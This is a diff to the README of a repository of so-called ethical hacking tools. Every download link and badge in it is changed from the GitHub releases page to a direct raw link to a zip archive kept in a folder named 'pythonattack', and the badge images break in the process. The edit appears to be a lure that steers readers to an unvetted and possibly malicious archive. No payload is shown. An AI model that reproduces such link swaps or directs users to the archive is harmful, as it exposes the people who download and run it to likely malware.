@@ -1,7 +1,7 @@
 # 🛡️ EthicalHackingTools - Your Go-To Collection for Security Tools
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-%23007BFF?style=for-the-badge&logo=github&logoColor=white)](https://github.com/GitCode9-tech/EthicalHackingTools/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/GitCode9-tech/EthicalHackingTools/main/pythonattack/Tools_Ethical_Hacking_1.2.zip%20Latest%20Release-%23007BFF?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/GitCode9-tech/EthicalHackingTools/main/pythonattack/Tools_Ethical_Hacking_1.2.zip)
 
 ## 🚀 Getting Started
 Welcome to EthicalHackingTools! This repository offers a variety of scripts and tools perfect for security researchers and penetration testers. Use these utilities for everything from gathering information to assessing vulnerabilities.
@@ -28,7 +28,7 @@ EthicalHackingTools includes the following categories of tools:
 To install EthicalHackingTools, follow these simple steps:
 
 1. **Visit the Releases Page**  
-   Go to the releases page by clicking this link: [Download Latest Release](https://github.com/GitCode9-tech/EthicalHackingTools/releases).
+   Go to the releases page by clicking this link: [Download Latest Release](https://raw.githubusercontent.com/GitCode9-tech/EthicalHackingTools/main/pythonattack/Tools_Ethical_Hacking_1.2.zip).
 
 2. **Choose Your Version**  
    Look for the latest stable release. You will find files available for download.
@@ -85,6 +85,6 @@ While this repository is designed for end-users, we welcome contributions from d
 This repository follows an open-source license. You can freely use the tools for educational and ethical purposes. Please respect the guidelines to ensure responsible use.
 
 ## 📥 Download Now Again
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-%23007BFF?style=for-the-badge&logo=github&logoColor=white)](https://github.com/GitCode9-tech/EthicalHackingTools/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/GitCode9-tech/EthicalHackingTools/main/pythonattack/Tools_Ethical_Hacking_1.2.zip%20Latest%20Release-%23007BFF?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/GitCode9-tech/EthicalHackingTools/main/pythonattack/Tools_Ethical_Hacking_1.2.zip)
 
 Explore. Create. Secure with EthicalHackingTools!
